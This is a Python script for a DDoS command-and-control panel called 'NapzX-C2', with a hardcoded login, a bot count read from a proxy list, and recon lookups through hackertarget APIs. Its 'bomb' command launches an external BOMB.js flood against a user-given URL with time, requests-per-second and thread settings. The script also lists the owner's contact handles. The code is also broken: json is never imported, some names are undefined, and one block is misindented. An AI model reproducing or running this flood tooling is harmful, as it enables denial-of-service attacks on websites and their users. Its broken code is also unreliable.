import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxy.txt').readlines()
bots = len(proxys)

def methods():
     with open('methods.json', 'r') as file:
        methods_data = json.load(file)

def owner():
    print("""
_____________________________
YOU CAN CONTACT OWNER WITH:
WA: [+62895433654343]
TELE: [@yusufhnfii]
IG: [@yusufhnfii_]
TT: [@yusufhnfii]
_____________________________""")

def tools():
    clear()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def menu():
    sys.stdout.write(f"         \x1b]2;NapzX-C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print("")
    print(""" 
                                    _______                       ____  ___         _________  ________  
                                    \      \ _____  ______________\   \/  /         \_   ___ \ \_____  \ 
                                    /   |   \\__  \ \____ \___   / \     /   ______ /    \  \/  /  ____/ 
                                   /    |    \/ __ \|  |_> >    /  /     \  /_____/ \     \____/       \ 
                                   \____|__  (____  /   __/_____ \/___/\  \          \______  /\_______ \
                                           \/     \/|__|        \/      \_/                 \/         \/
                                      username: [{username}] exipry: [27.40 Millenium(s)] Vip: [true]
  """)

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[C2\x1b[38;2;0;186;45mNa\x1b[38;2;0;150;88mp\x1b[38;2;0;113;133mZ\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "methods" or cnc == "METHODS":
            methods()
        elif cnc == "tools" or cnc == "TOOLS":
            tools()
        elif cnc == "owner" or cnc == "OWNER":
            owner()

#METHODS

        elif "bomb" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node BOMB.js {url} {time} {rps} {thread}')
            except IndexError:
                print('Usage: hyper <url> <time> <rps> <thread>')
                print('Example: hyper http://vailon.com 60 100 10')

#TOOLS

        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif help():
     print(f'''
METHODS  ► SHOW ALL METHODS
OWNER  ► CONTACT OWNER
TOOLS  ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

def login():
    clear()
    user = "yusufhnfii"
    passwd = "devc2"
    username = input("⚡ Username: ")
    password = getpass.getpass(prompt='⚡ Password: ')
    if username != user or password != passwd:
        print("")
        print("⚡ Haizzz, you're so cute...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Welcome to ZxC C2!")
        time.sleep(0.3)
        main()

login()
